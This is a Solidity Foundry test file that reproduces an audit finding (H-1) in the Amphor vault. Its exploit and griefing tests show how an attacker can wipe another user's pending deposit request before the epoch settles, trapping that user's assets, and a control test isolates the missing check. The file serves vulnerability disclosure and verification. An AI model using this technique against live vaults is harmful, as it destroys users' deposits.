// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./30916-h-1-claim-functions-dont-validate-if-the-epoch-is-settled-sh.sol";

/*//////////////////////////////////////////////////////////////
    Amphor — claim functions don't validate if the epoch is settled (H-1, #30916)

    AsyncSynthVault._claimDeposit() computes `shares` from previewClaimDeposit()
    (which returns 0 while the request's epoch is the CURRENT, unsettled one)
    but unconditionally zeroes the pending request regardless. Combined with
    claimAndRequestDeposit() letting ANY caller trigger a claim on behalf of an
    arbitrary receiver, an attacker can permanently wipe another user's pending
    deposit request for free, trapping that user's assets in the vault with 0
    shares to show for them.

    - test_exploit: drives the cheatcode-free Exploit end to end, then
      re-asserts the harm from the driver's perspective.
    - test_griefingWipesVictimRequest: standalone EOA rebuild mirroring the
      finding's two PoC scenarios (self-claim in the same epoch, and
      claimAndRequestDeposit-on-behalf-of).
    - test_control_claimAfterSettle_isCorrect: control — claiming AFTER the
      epoch settles gives the correct non-zero shares, isolating the missing
      "is this epoch settled?" check as the defect.
//////////////////////////////////////////////////////////////*/
contract AmphorEpochClaimTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        Vault vault = e.vault();
        MockAsset asset = e.asset();
        address alice = address(e.alice());

        assertEq(vault.pendingDepositRequest(alice), 0, "request wiped");
        assertEq(vault.balanceOf(alice), 0, "alice got 0 shares");
        assertEq(asset.balanceOf(address(vault)), e.DEPOSIT_AMOUNT(), "vault retains alice's assets unaccounted");
    }

    /// @notice Standalone rebuild mirroring the finding's PoC: an attacker
    ///         (Bob) wipes another account's (Alice) pending deposit request
    ///         via claimAndRequestDeposit before the epoch settles.
    function test_griefingWipesVictimRequest() public {
        MockAsset asset = new MockAsset();
        Vault vault = new Vault(address(asset));

        UserProxy alice = new UserProxy();
        GriefAttacker bob = new GriefAttacker();

        asset.mint(address(alice), 500e18);

        vault.close();
        alice.approveAndRequestDeposit(vault, asset, 500e18);
        assertEq(vault.pendingDepositRequest(address(alice)), 500e18, "request created");

        bob.wipeVictimRequest(vault, address(alice));

        assertEq(vault.pendingDepositRequest(address(alice)), 0, "request gone");
        assertEq(vault.balanceOf(address(alice)), 0, "alice got 0 shares for 500 assets");
    }

    /// @notice Control: the INTENDED usage (claim happens AFTER the epoch is
    ///         settled) yields correct, non-zero shares. This isolates the
    ///         missing "isCurrentEpoch" guard as the sole defect.
    function test_control_claimAfterSettle_isCorrect() public {
        MockAsset asset = new MockAsset();
        Vault vault = new Vault(address(asset));

        UserProxy alice = new UserProxy();
        asset.mint(address(alice), 500e18);

        vault.close();
        alice.approveAndRequestDeposit(vault, asset, 500e18);

        // Owner settles the epoch: 500 assets backing 500 shares (1:1), then reopens.
        vault.settleAndOpen(499, 499); // snapshot + 1 == 500 inside _convertToShares

        uint256 shares = alice.claimDeposit(vault);
        assertGt(shares, 0, "alice should receive non-zero shares after settlement");
        assertEq(vault.balanceOf(address(alice)), shares, "shares credited to alice");
    }
}
